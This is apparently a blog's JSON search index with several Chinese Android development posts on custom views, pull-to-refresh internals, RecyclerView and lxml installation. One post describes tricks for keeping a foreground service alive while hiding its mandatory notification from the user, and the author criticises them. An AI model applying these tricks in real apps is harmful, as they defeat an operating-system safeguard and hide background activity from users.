Item本身是继承自RelativeLayout，想要使onDraw方法被调用需要在构造函数里设置setWillNotDraw(false)这个boolean值默认是true，主要是顾及到性能的原因。 参考 How Android caculates view size","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Windows10平台安装lxml记录","date":"2016-10-31T15:49:38.000Z","path":"2016/10/31/2016-10-31-install-lxml-on-windows/","text":"前几天尝试使用一个简单的微博爬虫进行操作，导包的时候遇到lxml缺失的问题，找了好久最终在百度知道上找到个能用的，(⊙﹏⊙)b。 1. 环境 python2.7, win10 64位 pip 环境变量配置 2. 开始 cmd 命令行敲入 pip install wheel 准备lxml安装文件,下载地址,我的是win10 64位，选择 lxml-3.4.2-cp27-none-win_amd54.xhl 下载完成后放到 c:\\python27\\文件夹下 命令行敲入 pip install c:\\python27\\lxml…(刚才的文件名) 最后会提示 successfully installeed lxml-3.4.2 这时候关闭pycharm project，重新打开就可以看到导入成功了。 2018年1月更新首先确认pip是否安装了lxml，pip list(查看已安装的包)How to install LXML for Python 3 on 64-bit Windows因为安装的是python3.6，所以下载lxml‑4.1.1‑cp36‑cp36m‑win32.whl这个文件win10的64位系统只需要安装 lxml‑4.1.1‑cp36‑cp36m‑win32.whl ,如果安装lxml‑4.1.1‑cp36‑cp36m‑win_amd64.whl的话，可能会提示filename-whl-is-not-supported-wheel-on-this-platform，是因为安装的python是32位的。 Ref 百度有时候也是挺管用的","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"android-Ultra-pull-to-refresh分析","date":"2016-10-24T10:25:35.000Z","path":"2016/10/24/2016-10-24-a-peek-on-pull-to-refresh/","text":"最早开始接触安卓的时候就知道有Chris Banes的Pull-To-Refresh，当时这个库已经被标记被Deprecated了，后来出于寻找替代品的目的找到了秋百万的android-Ultra-pull-toRefresh，直接 当时甚至没有能力把一个Demo跑起来。之后的项目中，直接使用swipeRefreshLayout了。现在回头看，终于觉得可以尝试着分析一遍整个下拉刷新的过程。本文只针对android-Ultra-pulltoRefresh部分源码进行分析。拆一个轮子可能只需要花一天时间，但能够从无到有构思出这个框架，将项目搭建起来并且坚持长期维护真的是一件需要很强毅力的事情，向为开源社区贡献优秀代码的秋百万和众多做出贡献的开发者致敬。 1. 从Demo开始吧从github clone下来之后，改一下gradle版本，compile sdk version什么的就可以运行项目自带的Demo了.MainActivity 添加了一个PtrDemoHomeFragment,onCreateView里面返回的View对应的xml文件为fragment_ptr_home.xml &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot;&gt; &lt;in.srain.cube.views.ptr.PtrFrameLayout android:id=&quot;@+id/fragment_ptr_home_ptr_frame&quot; xmlns:cube_ptr=&quot;http://schemas.android.com/apk/res-auto&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; cube_ptr:ptr_duration_to_close=&quot;200&quot; cube_ptr:ptr_duration_to_close_header=&quot;1000&quot; cube_ptr:ptr_keep_header_when_refresh=&quot;true&quot; cube_ptr:ptr_pull_to_fresh=&quot;false&quot; cube_ptr:ptr_ratio_of_header_height_to_refresh=&quot;1.2&quot; cube_ptr:ptr_resistance=&quot;1.7&quot;&gt; &lt;ScrollView android:id=&quot;@+id/fragment_block_menu_scroll_view&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:background=&quot;@color/cube_mints_white&quot;&gt; &lt;in.srain.cube.views.block.BlockListView android:id=&quot;@+id/fragment_block_menu_block_list&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:padding=&quot;@dimen/cube_mints_content_view_padding&quot; /&gt; &lt;/ScrollView&gt; &lt;/in.srain.cube.views.ptr.PtrFrameLayout&gt; &lt;/LinearLayout&gt; 默认主页已经可以下拉刷新了，那么主要的事件拦截操作应该就在这个ptrFrameLayout里面 2. PtrFrameLayout源码从注释来看 This layout view for “Pull to Refresh(Ptr)” support all of the view, you can contain everything you want. support: pull to refresh / release to refresh / auto refresh / keep header view while refreshing / hide header view while refreshing It defines {@link in.srain.cube.views.ptr.PtrUIHandler}, which allows you customize the UI easily. 能够容纳各种View，同时支持下拉刷新，下拉释放刷新，自动刷新，刷新时保留刷新动画，刷新时隐藏刷新动画 一步步来看 构造函数 public class PtrFrameLayout extends ViewGroup { public PtrFrameLayout(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); //删除无关代码 TypedArray arr = context.obtainStyledAttributes(attrs, R.styleable.PtrFrameLayout, 0, 0); if (arr != null) { mHeaderId = arr.getResourceId(R.styleable.PtrFrameLayout_ptr_header, mHeaderId); // HeaderView的layout文件id mContainerId = arr.getResourceId(R.styleable.PtrFrameLayout_ptr_content, mContainerId); // contentView的layout文件id mDurationToClose = arr.getInt(R.styleable.PtrFrameLayout_ptr_duration_to_close, mDurationToClose);// 维持刷新动画多久开始关闭HeaderView mDurationToCloseHeader = arr.getInt(R.styleable.PtrFrameLayout_ptr_duration_to_close_header, mDurationToCloseHeader); float ratio = mPtrIndicator.getRatioOfHeaderToHeightRefresh(); ratio = arr.getFloat(R.styleable.PtrFrameLayout_ptr_ratio_of_header_height_to_refresh, ratio); mKeepHeaderWhenRefresh = arr.getBoolean(R.styleable.PtrFrameLayout_ptr_keep_header_when_refresh, mKeepHeaderWhenRefresh); mPullToRefresh = arr.getBoolean(R.styleable.PtrFrameLayout_ptr_pull_to_fresh, mPullToRefresh); arr.recycle(); } //ViewConfiguration很常见了，mTouchSlop用于判断用户操作手势是否有效 final ViewConfiguration conf = ViewConfiguration.get(getContext()); mPagingTouchSlop = conf.getScaledTouchSlop() * 2; } } 构造函数里面主要就是获得在xml中设定的一些自定义属性的值并保存为成员变量，实际用途后面再看。 onFinishInflate这个方法在inflate xml文件结束，所有的childView都已经添加之后调用PtrFrameLayout复写了这个方法， 首先检查ChildView数量，如果childCount &gt;2 会报错 然后检查两个child(这里主要看childCount=2的情况下) //省略若干 if (child1 instanceof PtrUIHandler) { mHeaderView = child1; mContent = child2; } else if (child2 instanceof PtrUIHandler) { mHeaderView = child2; mContent = child1; } //省略若干 来看一下这个ptrUIHandler public interface PtrUIHandler { /** * When the content view has reached top and refresh has been completed, view will be reset. * * @param frame */ public void onUIReset(PtrFrameLayout frame); /** * prepare for loading * * @param frame */ public void onUIRefreshPrepare(PtrFrameLayout frame); /** * perform refreshing UI */ public void onUIRefreshBegin(PtrFrameLayout frame); /** * perform UI after refresh */ public void onUIRefreshComplete(PtrFrameLayout frame); public void onUIPositionChange(PtrFrameLayout frame, boolean isUnderTouch, byte status, PtrIndicator ptrIndicator); } 大概可以猜到这货是用来指定下拉过程中的刷新开始，刷新结束，刷新结束后复位等过程的实现者，具体的下拉过程中的动画，位移等特效都应该由这接口的实例(View)来完成。 onMeasure```java@Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { super.onMeasure(widthMeasureSpec, heightMeasureSpec); //省略... measureContentView(mContent, widthMeasureSpec, heightMeasureSpec); } private void measureContentView(View child, int parentWidthMeasureSpec, int parentHeightMeasureSpec) { final MarginLayoutParams lp = (MarginLayoutParams) child.getLayoutParams(); final int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, getPaddingLeft() + getPaddingRight() + lp.leftMargin + lp.rightMargin, lp.width); final int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, getPaddingTop() + getPaddingBottom() + lp.topMargin, lp.height); child.measure(childWidthMeasureSpec, childHeightMeasureSpec); } 主要就是调用了measureContentView方法，都是很中规中矩的实现 4. **onLayout** 代码就不贴了，根据LayoutParams计算出需要的margin,最主要的Top是由 &gt; int offset = mPtrIndicator.getCurrentPosY(); 获得的，mPterIndicator是一个单独的组件，用于保存一些实时状态。 滑动过程中如果有动画效果，会走到这个方法里，所以及时更新最新的位置很重要，ptr将这一功能剥离出来，这大概就是我所理解的解耦吧。 5. **dispatchTouchEvent** 主要的手势处理逻辑都在这里，关于TouchEvent的分发处理，这里不再赘述。 简单列出执行顺序: &gt; ViewGroup.dispatchTouchEvent----ViewGroup.onInterceptTouchEvent---View.dispatchTouchEvent----- etc 、、、、 简书上有作者写出了非常好的关于TouchEvent分发的[文章](http://www.jianshu.com/p/e99b5e8bd67b)，忘记了的话可以去看看。 来看这部分的实现，有删节 ```java @Override public boolean dispatchTouchEvent(MotionEvent e) { //..... switch (action) { case MotionEvent.ACTION_UP: case MotionEvent.ACTION_CANCEL: if (mPtrIndicator.hasLeftStartPosition()) { onRelease(false); //手指抬起后的操作 // ...... return dispatchTouchEventSupper(e); } else { return dispatchTouchEventSupper(e); } case MotionEvent.ACTION_DOWN: //取消之前还在运行的Scroller等等。。 // The cancel event will be sent once the position is moved. // So let the event pass to children. // fix #93, #102 dispatchTouchEventSupper(e); return true;//这里返回true，child将会受到ACTION_CANCEL case MotionEvent.ACTION_MOVE: mLastMoveEvent = e; //这里实时更新装填 mPtrIndicator.onMove(e.getX(), e.getY()); float offsetX = mPtrIndicator.getOffsetX(); float offsetY = mPtrIndicator.getOffsetY(); boolean moveDown = offsetY &gt; 0; boolean moveUp = !moveDown; boolean canMoveUp = mPtrIndicator.hasLeftStartPosition(); // disable move when header not reach top if (moveDown &amp;&amp; mPtrHandler != null &amp;&amp; !mPtrHandler.checkCanDoRefresh(this, mContent, mHeaderView)) { return dispatchTouchEventSupper(e); } if ((moveUp &amp;&amp; canMoveUp) || moveDown) { movePos(offsetY); //实现滑动操作的代码 return true;// 后续事件将只会走到此方法，不会再往下传递，直到ACTION_UP，本次手势结束 } } return dispatchTouchEventSupper(e); } 用户手指按下。。。。。手指滑动。。。。。手指抬起 ACTION_DOWN : 手指按下后将TouchEvent交给mPtrIndicator处理，后者保留了当前ptr的位置，高度等信息。在执行ACTION_DOWN时，并没有简单地使用Event.getY，而是保留了当前position的一个备份(这是必要的，因为对于下拉刷新来说，最终需要回到的位置是0，而用户按下的位置可能在contentView比较靠下面的位置。ACTION_DOWN的getY并没有太大意义)。随后调用Scroller的 mScroller.forceFinished(true)方法停止滑动，如果定义了页面自动刷新(就是进来会下拉刷新一次)，还会调用onRelease(true)方法，onRelease方法与ACTION_UP相关。 ACTION_MOVE : 手指开始在屏幕上滑动，首先将滑动距离的改变保留到mPtrIndicator中，这里作者将很多坐标计算的方法都拆出来放到这个mPtrIndicator中，暴露出get方法，也使得代码更清晰。在开始滑动之前，先检查下是否是横向滑动，以及是否在(mDisableWhenHorizontalMove，ViewPager需要消费横向手势，这个标志符是为了return super)。往下走，来看这一段 boolean moveDown = offsetY &gt; 0; 新的Event中的y值和mptrIndicator中保留的当前y的差值，所以手指往下拉的话，offset &gt;0,也就是这里的moveDown boolean moveUp = !moveDown; boolean canMoveUp = mPtrIndicator.hasLeftStartPosition()// 检查下当前Event中的y是否大于0，即内容区域是否已经往下走了一点了 接下来，再次询问mPtrHandler能否DoRefresh,将自身和ChildView都交出去，所以可操作性很大大部分的情况下，直接使用一个 return PtrDefaultHandler.checkContentCanBePulledDown(frame, content, header); 使用了一个类似于ViewCompat.canScollVertically的方法，但判断下如果是AbstractListView的话，会调用getFirstVisiblePosition等方法，因为AdapterView能否滑动应该是由其内容能否滑动来决定的。如果这个方法返回true。接着往下走，开始执行View的滑动方法:判断下是否手指在往上拉(moveUp &amp;&amp; canMoveUp)或者往下拉(moveDown),return true，首先事件就不会再往下走，另外后续的ACTION_MOVE_ACTION_UP都只会传递到这个dispatchTouchEvent中实现滑动操作的代码最后会执行这里 private void updatePos(int change) { boolean isUnderTouch = mPtrIndicator.isUnderTouch(); // once moved, cancel event will be sent to child if (isUnderTouch &amp;&amp; !mHasSendCancelEvent &amp;&amp; mPtrIndicator.hasMovedAfterPressedDown()) { mHasSendCancelEvent = true; sendCancelEvent(); } // leave initiated position or just refresh complete if ((mPtrIndicator.hasJustLeftStartPosition() &amp;&amp; mStatus == PTR_STATUS_INIT) || (mPtrIndicator.goDownCrossFinishPosition() &amp;&amp; mStatus == PTR_STATUS_COMPLETE &amp;&amp; isEnabledNextPtrAtOnce())) { mStatus = PTR_STATUS_PREPARE; mPtrUIHandlerHolder.onUIRefreshPrepare(this);//刚开始往下移一点点或者刚刚从下面回到0的位置，可以认为是下拉刷新刚开始和刚结束的时候。这个Holder的结构类似于一个链表，一个Holder里面有UIHandler，以及下一个Holder(next)。作用类似于一个集合，等于作者自己实现了这样一个不断循环的消息列表(看起来挺像Message的)。这个Holder的作用在于可以动态添加UIHanlder，相对应的方法都做好了(addHandler)。 //再次强调，这里表示**刚开始往下移一点点或者刚刚从下面回到0的位置，可以认为是下拉刷新刚开始和刚结束的时候。此时的状态为STATUS_PREPARED** } // back to initiated position if (mPtrIndicator.hasJustBackToStartPosition()) { tryToNotifyReset(); //**刚刚从下面回到0的位置，通知UIHandler的onUIReset()方法,此时的状态为STATUS_INIT** //将整个过程划分的真详细 // recover event to children，虽然手指还在屏幕上，处于ACTION_MOVE，但这里由于已经复位，需要把ACTION_DOWN传递下去，这一段比较复杂。 if (isUnderTouch) { sendDownEvent(); } } // Pull to Refresh if (mStatus == PTR_STATUS_PREPARE) {//从上到下依次为0 ， 出现动画临界值， HeadView高度 // reach fresh height while moving from top to bottom if (isUnderTouch &amp;&amp; !isAutoRefresh() &amp;&amp; mPullToRefresh // 手指还在屏幕上，不是自动刷新且允许ptr且到达了下滑出现动画效果的临界值，条件还是比较苛刻的 &amp;&amp; mPtrIndicator.crossRefreshLineFromTopToBottom()) { tryToPerformRefresh(); } // reach header height while auto refresh if (performAutoRefreshButLater() &amp;&amp; mPtrIndicator.hasJustReachedHeaderHeightFromTopToBottom()) {//刚刚超过headerView高度一丁点 tryToPerformRefresh(); } } //tryToPerformRefresh()方法判断mPtrIndicator.isOverOffsetToRefresh()，满足条件的话进入STATUS_LOADING，这个时候就要开始让动画run了。所以这里调用的是 mPtrUIHandlerHolder.onUIRefreshBegin(this);和mPtrHandler.onRefreshBegin(this);前者是后来手动添加的UIHandler，后者则是在onInFlateFinish中自行判断的，这两个都会被执行。这里扯一句，这个Holder就像一个中间层，持有了UIHandler,所有方法都调用的是后者HanldleUI的方法。facade模式？ // 终于看到实际调用View滑动的代码了，让一个View滑动的方式有很多种，这里采用的是改变X,Y的方式(X = left+translationX;Y = top+translationY) mHeaderView.offsetTopAndBottom(change); if (!isPinContent()) { mContent.offsetTopAndBottom(change); } invalidate();??我觉得这里好像没有必要这么频繁的调这一句话 //移动完成之后通知UIHandlerHolder位置改变了，没有通知mUIHandler是因为后者就是mContent和mHeaderView。 if (mPtrUIHandlerHolder.hasHandler()) { mPtrUIHandlerHolder.onUIPositionChange(this, isUnderTouch, mStatus, mPtrIndicator); } onPositionChange(isUnderTouch, mStatus, mPtrIndicator);//最后还预留了一个onPositionChange的空方法，子类可能会有点用吧 } 到这里，ACTION_MOVE已经研究完毕，大部分的分析都在注释里面，只要分清楚滑动过程中的各种STATUS，我觉得还是比较好理解的。MOVE过程中伴随着距离的变化，ptr也进入不同的status，ptr本身其实只做了移动headrView和childView的工作，实际的动画效果等等都是由UIHanlder拿着ptr的实例去做的。关于能够滑动多少距离的问题，由于这里并没有判断，所以，这个contentView的下滑是没有下限的，不过在xml里面有一个自定义的resistance，相当于阻力系数了，设置大一点的话就不会出事。目前手指还在屏幕上，status等于STATUS_PREPARED或者STATUS_LOADING。借用手机评测那帮人的话来说，跟手 ACTION_UP： mPtrIndicator中的mPressed设置为false，标示下当前手指已经不按在屏幕上了。如果这时候的位置&gt;0，就是contentView还没有复位，需要想办法让它”弹回来”，这部分工作交给了onRelease(false)，这个false我猜肯定是后面加上去的(查了下git log果然。。。)。来看OnRelease: private void onRelease(boolean stayForLoading) { tryToPerformRefresh();//会检查下当前status!=STATUS_PREPARED的话直接return false，就是不是在刚开始或刚复位的情况下不做；否则继续执行performRefresh操作，其实这样想也符合常理，手指离开了屏幕，ptr应该能够自我判断是否还需要执行动画 if (mStatus == PTR_STATUS_LOADING) { // keep header for fresh if (mKeepHeaderWhenRefresh) { // scroll header back if (mPtrIndicator.isOverOffsetToKeepHeaderWhileLoading() &amp;&amp; !stayForLoading) {//已经过了需要加载动画的位置，statyForLoading这里传进来的是false mScrollChecker.tryToScrollTo(mPtrIndicator.getOffsetToKeepHeaderWhileLoading(), mDurationToClose);//滑动到加载动画的位置，这里面是不断地post一个runnable，在run方法里面调用之前和ACTION_MOVE里面一样的那个movePos方法，所以重用性还好。也会通知相应的UIHandler或者UIHandlerHolder } else { // do nothing } } else { tryScrollBackToTopWhileLoading();//这里会一直滑动到0的位置，其实也是不断调用updatPos方法，会将STATUS重置为STATUS_INIT或者STATUS_PREPARED } } else { if (mStatus == PTR_STATUS_COMPLETE) {//STATUS_COMPLETE通常由外部调用者调用refreshComplete public 方法设置，相当于SwipeRefreshLayout的setRefreshing()，否则将一直停留在加载状态。也就是说需要调用者手动设置关闭，这也符合常理，因为加载本身是需要时间的，把这个设置的时机交给开发者来手动设置几乎是唯一的选择。 notifyUIRefreshComplete(false); } else { tryScrollBackToTopAbortRefresh(); } } } 到此，ptr内部只剩下一些getter和setter了，不再解释，结合Demo使用就会有所体会。 3. 总结ptr的本质就是通过ViewGroup的dispatchTouchEvent将事件拦截在内部进行处理，并将事件过程分发给几个自定义的接口。而内部又添加了一些自定义的变量，并给出getter和setter，使得外部调用者使用起来十分轻松。只要掌握好事件分发处理和View的绘制流程，拆起来还算简单。当然，如果在实际项目中碰到了类似的需求，我倾向于定制一个简单一点的小工具。","tags":[{"name":"置顶","slug":"置顶","permalink":"https://haldir65.github.io/tags/置顶/"}]},{"title":"让service常驻后台的方法","date":"2016-10-20T21:35:10.000Z","path":"2016/10/20/2016-10-20-android-dirty-code/","text":"今天在V2EX上看到有人提到Notification有漏洞，好奇也就查了一下，结果发现有人专门针对这个问题进行了分析。本身的技术分析并不多，写在这里只是为了作为今后的一个参考。 1. 问题的由来Android对后台应用是有一个权重区分的，最直观的就是查看最近使用的应用，这里每一个应用可能有一个或者多个Process，而系统在资源紧张时会干掉一些Process，而决定后台应用生死的是一个Lru List，也就是least recently used 会被干掉。显然大家都不希望自己被干掉，DAU对于很多应用来说是优先于系统资源和用户体验的。根据官方文档,Android Process有五种，根据优先级从高到低为: 前台进程 可见进程 服务进程 后台进程 空进程 越靠前的进程就越不容易被系统干掉，所以大家都希望能够成为前台进程。成为前台进程的条件: 用户当前操作所必需的进程。如果一个进程满足以下任一条件，即视为前台进程： 托管用户正在交互的 Activity（已调用 Activity 的 onResume() 方法） 托管某个 Service，后者绑定到用户正在交互的 Activity 托管正在“前台”运行的 Service（服务已调用 startForeground()） 托管正执行一个生命周期回调的 Service（onCreate()、onStart() 或 onDestroy()） 托管正执行其 onReceive() 方法的 BroadcastReceiver 通常，在任意给定时间前台进程都为数不多。只有在内在不足以支持它们同时继续运行这一万不得已的情况下，系统才会终止它们。 此时，设备往往已达到内存分页状态，因此需要终止一些前台进程来确保用户界面正常响应。 以上条件只有startForeground满足条件了，但大家都知道startForeground会在通知栏常驻一个Notification，且用户取消不了。对于我这种强迫症来说实在是太丑。 2. startForeground一定会在系统状态栏显示一个通知，真的吗?void startForeground (int id, Notification notification) 我找到了G+上的Chris Banes的一篇post，这其中明确指出 Unfortunately there are a number of applications on Google Play which are using the startForeground() API without passing a valid notification. While this worked in previous versions of Android, it is a loophole which has been fixed in Android 4.3. The system now displays a notifications for you automatically if you do not provide a valid one. 也就是说，API 18以前，只需要提供一个无效的Notification就可以让Notification不显示了。所以，判断下API&lt;18的时候，直接new Notification()就可以得到一个不完整的Notification.文章也指出了这是一个Loophole（已经是个贬义词了）。Api 18之后的修复措施，看ServiceRecord的源码: public void postNotification() { final int appUid = appInfo.uid; final int appPid = app.pid; if (foregroundId != 0 &amp;&amp; foregroundNoti != null) { // Do asynchronous communication with notification manager to // avoid deadlocks. final String localPackageName = packageName; final int localForegroundId = foregroundId; final Notification localForegroundNoti = foregroundNoti; ams.mHandler.post(new Runnable() { public void run() { NotificationManagerService nm = (NotificationManagerService) NotificationManager.getService(); if (nm == null) { return; } try { if (localForegroundNoti.icon == 0) { // It is not correct for the caller to supply a notification // icon, but this used to be able to slip through, so for // those dirty apps give it the app&#39;s icon. localForegroundNoti.icon = appInfo.icon; // Do not allow apps to present a sneaky invisible content view either. localForegroundNoti.contentView = null; localForegroundNoti.bigContentView = null; CharSequence appName = appInfo.loadLabel( ams.mContext.getPackageManager()); if (appName == null) { appName = appInfo.packageName; } Context ctx = null; try { ctx = ams.mContext.createPackageContext( appInfo.packageName, 0); Intent runningIntent = new Intent( Settings.ACTION_APPLICATION_DETAILS_SETTINGS); runningIntent.setData(Uri.fromParts(&quot;package&quot;, appInfo.packageName, null)); PendingIntent pi = PendingIntent.getActivity(ams.mContext, 0, runningIntent, PendingIntent.FLAG_UPDATE_CURRENT); localForegroundNoti.setLatestEventInfo(ctx, ams.mContext.getString( com.android.internal.R.string .app_running_notification_title, appName), ams.mContext.getString( com.android.internal.R.string .app_running_notification_text, appName), pi); } catch (PackageManager.NameNotFoundException e) { localForegroundNoti.icon = 0; } } if (localForegroundNoti.icon == 0) { // Notifications whose icon is 0 are defined to not show // a notification, silently ignoring it. We don&#39;t want to // just ignore it, we want to prevent the service from // being foreground. throw new RuntimeException(&quot;icon must be non-zero&quot;); } int[] outId = new int[1]; nm.enqueueNotificationInternal(localPackageName, localPackageName, appUid, appPid, null, localForegroundId, localForegroundNoti, outId, userId); } catch (RuntimeException e) { Slog.w(ActivityManagerService.TAG, &quot;Error showing notification for service&quot;, e); // If it gave us a garbage notification, it doesn&#39;t // get to be foreground. ams.setServiceForeground(name, ServiceRecord.this, 0, null, true); ams.crashApplication(appUid, appPid, localPackageName, &quot;Bad notification for startForeground: &quot; + e); } } }); } } 单单是看注释大概能看出来Android团队对于这种做法的不满。所以如果不提供有效Notification，则显示你的App的Icon。所以Api 18以上一定会显示一个Notification。 然而套路还是太深。。。。又有人给出了API 18以上的解决办法:我在这里找到了新的方法，简单来说就是起两个Service，两个Service都在一个进程里。先Start A Service ，onCreate里面 bind B Service，在onServiceConnected的时候A service startForeground(processId,notification)B service startForeground(processId,notification)随后立即调用B service stopForeGround(true)由于两个Notification具有相同的id，所以A service最终成为Foreground Service，Notification也被清除掉了。 3.最后整个过程看下来，API 18以下，给一个不完整的Notification(比如new Notification())，就不会出现在通知栏；API 18以上，起两个Service，B Service负责取消Notification就可以了。目前看来，国内很多App为了保活，都采取了类似的方式。而整体技术层面的实现并不难，只是利用了一个又一个小漏洞罢了。所谓脏代码不过是技术上做的一些欺骗系统的手段，作为开发者，理应明白谷歌设计这一套系统是为了更好的提升用户体验（占据市场）。然而在当前国内应用开发环境下，我们真的能够为用户考虑考虑吗，或者说，我们提交的代码能吗？ updates【腾讯Bugly干货分享】Android 进程保活招式大全 CommonsWare表示 Services are natural singletons ，Service都是单例 Reference 支付宝后台不死的黑科技 Android的startForeground前台Service如何去掉通知显示","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"自定义LayoutManager","date":"2016-10-20T16:37:42.000Z","path":"2016/10/20/2016-10-20-write-your-own-layoutmanager/","text":"1. 系统为我们提供了LinearLayoutManager、GridLayoutManager和StaggeredGridLayoutManager。基本用法都很简单，这里记录一些重要的用法 GridLayoutManager可以设置某个Item在某一行占据的Column num（VERTICAL的情况下）代码如下:```javaGridLayoutManager manager = new GridLayoutManager( this,2 ,GridLayoutManager.VERTICAL,false) manager.setSpanSizeLookup(){ new GridLayoutManager.SpanSizeLookup(){ @override public int getSpanSize(int position){ return (position % 3 == 0 ? 2 : 1) } } } 所以，一开始可以把这个2设置大一点，后面可以动态设置，看上去就会造成一种多种格子的错觉。 - GridLayoutManger的同一行的ItemView的itemHeight必须一致，否则同一行的ItemView底部会出现空隙。这种情况请使用StaggeredGridLayoutManager ### 2. LayoutManager &lt;-------&gt; Recycler &lt;--------&gt; Adapter LayoutManager永远永远永远不要碰Adapter!!! ### 3.Recycler构造 Recycler内部有两个集合: 1. Scrap Heap ： detachAndScrapView() 暂时不用的View丢到这里，随时取回使用 2. Recycle Pool: removeAndRecycleView() 确定不需要的View丢到这里，拿回来时position或者data变了 ### 4.FillGaps,最重要的方法 1. Discover firstVisible position/location 2. 找到layout Gaps ```java findFirstVisiblePosition Scrap everything(丢到ScrapHeap)/** * Temporarily detach and scrap all currently attached child views. Views will be scrapped * into the given Recycler. The Recycler may prefer to reuse scrap views before * other views that were previously recycled. * * @param recycler Recycler to scrap views into */ public void detachAndScrapAttachedViews(Recycler recycler) { final int childCount = getChildCount(); for (int i = childCount - 1; i &gt;= 0; i--) { final View v = getChildAt(i); scrapOrRecycleView(recycler, i, v); } } Lay out all visible positions for(...){ int nextPosition = ...; View view = recycler.getViewForPosition(nextPosition); addView(view); //注意这里的Measure和Layout不是平时使用的measureChild和layout方法，原因是ItemDecoration measureChildWithMargin(view,...) layoutDecorated(view,....) } Recycle remaining viewsfinal List&lt;RecyclerView.ViewHolder&gt; scrapList = recycler.getScrapList(); for(int i=0;i&lt;scrapList.size;i++){ final View removingView = scrapList.get(i); recycler.recycleView(removingView); } 注意: 丢到RecyclerPool的View的viewHolder、LayoutParams都被清除掉 4. Scroll事件 public int scrollHorizontallyBy(int dx, RecyclerView.Recycler recycler, RecyclerView.State state) { //dx 表示系统根据传入的TouchEvent告诉你应该滑动多少 dx &lt;0 内容向右滑动 dx &gt; 0内容向左滑动 //这个正负号和ScrollBy那个是一样的邪门 //返回值是你告诉系统你实际滑动了多少 offsetChildrenHorizontal(delta);//调用该方法会帮助你移动所有的ChildView，比一个个Iterate方便多了 } 5.notifyDataSetChanged()调用了什么函数最终会走到onLayoutChildren这里面，就跟重新走一遍layout就可以了 6.ScrollToPosition()和SmoothScrollToPosition()两者的实现的不同:scrollToPosition:Track Requested Position、Trigger requestLayoutSmoothscrollToPosition: Create a SmoothScroller instance、Set the Target Position、invoke startSmoothScrollSmoothScroller是一个接口，在里面实现computeScrollVectorForPosition返回需要到达的位置 7. supportPredictiveItemAnimation主要用于ItemChange Animation主要在发生变化时展示动画。如果想要在滑动过程中展示动画的话，可以考虑在onViewAttachedToWindow或者onBindViewHolder里面给View添加TranslationX（从左边出来），Alpha(透明度从0变成1)，或者ScaleX等等 Reference Dave Smith 500px","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"使用RecyclerView的Animation","date":"2016-10-20T16:16:49.000Z","path":"2016/10/20/2016-10-20-RecyclerViewAnimationStuff/","text":"From the talkRecyclerView Animations and Behind the ScenesYigit Biyar &amp; Chet Haaseon Anroid Dev Summit 2015 1. RecyclerView架构RecyclerView is Flexible , Pluggable and Customizeable内部很多功能都交给了各个组件去完成ChildHelper 、AdapterHelper 、Recycler对于开发者来说并不常用，但它们在内部负责了许多针对Child View的管理。 ViewHolder的创建1 .LayoutManager首先检查getViewForPosition，RecyclerView查找Cache(getViewForPosition)，如果找到了。直接交给LayoutManager,这一过程甚至不需要与Adapter接触。 如果Cache中未找到，RecyclerView调用Adpter的getViewType，并去Recycled Pool中getViewHolderByType。 如果在Pool中未找到，RecyclerView将调用Adapter的createViewHolder。 如果在Pool中这种Type的ViewHolder已经有了，或者步骤3中创建了一个新的viewHolder，bindViewHolder并交给LayoutManager。 最终LayoutManager将把这个View添加到UI，这时会调用RecyclerView的onViewAttachedToWindow回调（生命周期）。 ViewHolder的回收(Reserves) LayoutManager调用removeAndRecycleView，RecyclerView会在这里收到回调onViewDetachedFromWindow 检查这个View.isValid。这一点很重要，在scroll过程中，如果一个View是Valid的话，可以将View添加到Cache中，随后可以简单将其复用。Cache将会invalidate oldest one，并告诉Adapter(onViewRecycled)。 如果不是Valid的View，将会被添加到Pool中，Adapter会收到onViewRecycled回调。 ViewHolder的另一种更好的回收方式(Fancy Reserves!) LayoutManager调用onLayoutChildren Layout完成后，RecyclerView检查那些之前已经被layout了的但不再存在于屏幕上了。RecyclerView将这些View重新添加到ViewGroup中，这些View此时对LayoutManager不可见。重新添加的目的在于动画。 RecyclerView这时候把这些本不该add的View交给ItemAnimator，后者调用动画效果，300ms(安卓中大部分默认动画时间是300ms)之后，调用onAnimationFinished，告诉RecyclerView. 接着RecyclerView通知Adapter(onViewDetachedFromWindow) 最后将这些View添加到Cache或者Recycled Pool。 ViewHolder的销毁 LayoutManager调用removeAndRecycleView，RecyclerView检查View是否valid 如果不是Valid，添加到RecycledPool中，但在这之前先检查是否 hasTransientState（例如正在运行动画） 如果这个View正好处在Animation中，一些属性被Animating， Pool会调用Adapter的onFailedToRecycle(Adapter中应该复写这个方法，取消动画) onFailedToRecycle(ViewHolder)返回true的话，Pool将无视View的TransientState并回收这个View(可能处在动画中) 另一种可能导致ViewHolder被销毁的方式RecyclerView将View添加到Pool中(实际调用的是addViewHolderToRecycledViewPool(ViewHolder))，Pool会检查这种type的ViewHolder是否还放得下（例如type x的ViewHolder已经有5个了，实在太多了），这种情况下就会Kill这种View,这种情况是我们希望避免的。开发者可以调用pool.setMaxRecycledViews(type,count)来让Pool放更多的Holder per type。 一些需要注意的，Pool是基于一个Activity Context的。 2. 使用LayoutManager配合ItemAnimator自定义ItemView的动画的步骤perdictiveItemAnimation的关键在于RecyclerView的list并不局限于屏幕。在LayoutManager中复写 supportPredictiveItemAnimations()，返回true。 LinearLayoutManger的实现 @Override public boolean supportsPredictiveItemAnimations() { return mPendingSavedState == null &amp;&amp; mLastStackFromEnd == mStackFromEnd; } 可以认为返回值就是true 